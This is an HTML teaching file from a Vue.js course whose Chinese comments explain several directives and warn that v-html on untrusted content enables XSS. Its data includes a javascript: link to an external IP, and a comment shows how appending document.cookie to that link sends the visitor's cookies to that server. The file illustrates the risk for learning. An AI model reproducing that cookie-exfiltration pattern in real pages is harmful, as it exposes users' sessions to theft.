<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
    <!-- 引入 js 文件   vue.js 为开发版本  vue.main.js 为生成版本(没有代码提示,用于代码开发完成上线) -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        我们学过的指令：
                v-bind	: 单向绑定解析表达式, 可简写为 :xxx
                v-model	: 双向数据绑定
                v-for  	: 遍历数组/对象/字符串
                v-on   	: 绑定事件监听, 可简写为@
                v-if 	 	: 条件渲染（动态控制节点是否存存在）
                v-else 	: 条件渲染（动态控制节点是否存存在）
                v-show 	: 条件渲染 (动态控制节点是否展示)
        v-text指令：
                1.作用：向其所在的节点中渲染文本内容。
                2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
        v-html指令：
                1.作用：向指定节点中渲染包含html结构的内容。
                2.与插值语法的区别：
                            (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                            (2).v-html可以识别html结构。
                3.严重注意：v-html有安全性问题！！！！
                            (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                            (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
        v-cloak指令（没有值）：
                1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
                2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
        v-once指令：
                1.v-once所在节点在初次动态渲染后，就视为静态内容了。
                2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
        v-pre指令：
                1.跳过其所在节点的编译过程。
                2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
    -->

    <div id="root">
        <!-- v-cloak 当vue实例还没创建的时候存在  当vue接管容器之后删除  可以跟css样式配合使用 -->
        <!-- 比如设置 v-cloak 标签的对象 display: none; 当v-cloak消失之后自然样式就不会限制了 -->
        <h2 v-cloak>{{name}}</h2>
        <!-- v-text按照name的值替换整个div的内容  而且只会当成文本解析，不会当成标签解析 -->
        <h2 v-text="name"></h2>
        <div v-html="str"></div>
        <div v-html="str2"></div>
        <!-- v-once 设置后当前控件n不变 也就是初次设置之后变成静态内容  但是其他带有n的控件值改变 -->
        <h2 v-once>初始化的n值是：{{n}}</h2>
        <h2>当前的n值是：{{n}}</h2>
        <button @click="n++">点我n+1</button>
        <!-- v-pre 跳过其所在节点的编译过程  加快编译 -->
        <h2 v-pre>其实很简单</h2>
    </div>

    <script>
        Vue.config.productionTip = false  // 设置为 false 以阻止 vue 在启动时生成生产提示
        new Vue({
            el:'#root',
            data:{
                name:'尚硅谷',
                str:'<h3>你好啊</h3>',
                // href="http://47.115.202.207:3000?"+document.cookie会将当前网页cookie传到跳转网页
                str2:'<a href=javascript:location.href="http://47.115.202.207:3000">我的服务器记账本实战网页</a>',
                n:1,
            }
        })

    </script>
</body>
</html>
